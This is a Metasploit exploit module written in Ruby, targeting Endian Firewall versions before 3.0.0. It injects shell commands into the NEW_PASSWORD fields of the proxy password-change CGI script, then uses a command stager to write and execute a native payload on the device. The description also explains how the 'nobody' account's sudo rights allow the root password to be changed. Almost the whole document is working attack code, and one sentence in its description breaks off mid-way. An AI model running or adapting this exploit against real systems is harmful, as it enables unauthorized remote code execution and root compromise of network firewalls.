# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Endian Firewall < 3.0.0 Proxy Password Change Command Injection&#039;,
      &#039;Description&#039; => %q{
        This module exploits an OS command injection vulnerability in a 
        web-accessible CGI script used to change passwords for locally-defined
        proxy user accounts. Valid credentials for such an account are 
        required.
        Command execution will be in the context of the "nobody" account, but 
        on versions of EFW I tested, this account had broad sudo permissions, 
        including to run the script /usr/local/bin/chrootpasswd as root. This 
        script changes the password for the Linux root account on the system 
        to the value specified by console input once it is executed.
        The password for the proxy user account specified will *not* be 
        changed by the use of this module, as long as the target system is 
        vulnerable to the exploit.
        Very early versions of Endian Firewall (e.g. 1.1 RC5) require
        HTTP basic auth credentials as well to exploit this vulnerability.
        Use the standard USERNAME and PASSWORD advanced options to specify
        these values if required.
        Versions >= 3.0.0 still contain the vulnerable code, but it appears to 
        never be executed due to a bug in the vulnerable CGI script which also
        Tested successfully against the following versions of EFW Community:
        1.1 RC5, 2.0, 2.1, 2.5.1, 2.5.2.
    Used Apache mod_cgi Bash Environment Variable Code Injection 
    and Novell ZENworks Configuration Management Remote Execution
    modules as templates.
      },
      &#039;Author&#039; => [
    &#039;Ben Lincoln&#039; # Vulnerability discovery, exploit, Metasploit module
      ],
      &#039;References&#039; => [
#        [&#039;CVE&#039;, &#039;&#039;],
#        [&#039;OSVDB&#039;, &#039;&#039;],
#        [&#039;EDB&#039;, &#039;&#039;],
        [&#039;URL&#039;, &#039;http://jira.endian.com/browse/COMMUNITY-136&#039;]
      ],
      &#039;Privileged&#039;  => false,
      &#039;Platform&#039;    => %w{ linux },
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x0a\x0d",
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 2048
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux x86&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86,
              &#039;CmdStagerFlavor&#039; => [ :echo, :printf ]
            }
          ],
          [ &#039;Linux x86_64&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86_64,
              &#039;CmdStagerFlavor&#039; => [ :echo, :printf ]
            }
          ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 10443
        },
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 28 2015&#039;,
      &#039;License&#039; => MSF_LICENSE
    ))
 
    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to chpasswd.cgi CGI script&#039;, 
        &#039;/cgi-bin/chpasswd.cgi&#039;]),
      OptString.new(&#039;EFW_USERNAME&#039;, [true, 
        &#039;Valid proxy account username for the target system&#039;]),
      OptString.new(&#039;EFW_PASSWORD&#039;, [true, 
        &#039;Valid password for the proxy user account&#039;]),
      OptInt.new(&#039;CMD_MAX_LENGTH&#039;, [true, &#039;CMD max line length&#039;, 200]),
      OptString.new(&#039;RPATH&#039;, [true, 
        &#039;Target PATH for binaries used by the CmdStager&#039;, &#039;/bin&#039;]),
      OptInt.new(&#039;TIMEOUT&#039;, [true, &#039;HTTP read response timeout (seconds)&#039;, 10])
     ], self.class)
  end
 
  def exploit
    # Cannot use generic/shell_reverse_tcp inside an elf
    # Checking before proceeds
    if generate_payload_exe.blank?
      fail_with(Failure::BadConfig, 
        "#{peer} - Failed to store payload inside executable, " + 
        "please select a native payload")
    end
 
    execute_cmdstager(:linemax => datastore[&#039;CMD_MAX_LENGTH&#039;], 
      :nodelete => true)
  end
 
  def execute_command(cmd, opts)
    cmd.gsub!(&#039;chmod&#039;, "#{datastore[&#039;RPATH&#039;]}/chmod")
 
    req(cmd)
  end
 
  def req(cmd)
    sploit = "#{datastore[&#039;EFW_PASSWORD&#039;]}; #{cmd};"
 
    boundary = "----#{rand_text_alpha(34)}"
    data = "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"ACTION\"\r\n\r\n"
    data << "change\r\n"
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"USERNAME\"\r\n\r\n"
    data << "#{datastore[&#039;EFW_USERNAME&#039;]}\r\n"
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"OLD_PASSWORD\"\r\n\r\n"
    data << "#{datastore[&#039;EFW_PASSWORD&#039;]}\r\n"
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"NEW_PASSWORD_1\"\r\n\r\n"
    data << "#{sploit}\r\n"
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"NEW_PASSWORD_2\"\r\n\r\n"
    data << "#{sploit}\r\n"
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"SUBMIT\"\r\n\r\n"
    data << "  Change password\r\n"
    data << "--#{boundary}--\r\n"
 
    refererUrl = 
      "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}" + 
      "#{datastore[&#039;TARGETURI&#039;]}"
 
    send_request_cgi(
      {
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => datastore[&#039;TARGETURI&#039;],
    &#039;ctype&#039; => "multipart/form-data; boundary=#{boundary}",
        &#039;headers&#039; => {
          &#039;Referer&#039; => refererUrl
        },
        &#039;data&#039; => data
      }, datastore[&#039;TIMEOUT&#039;])
 
  end
 
end

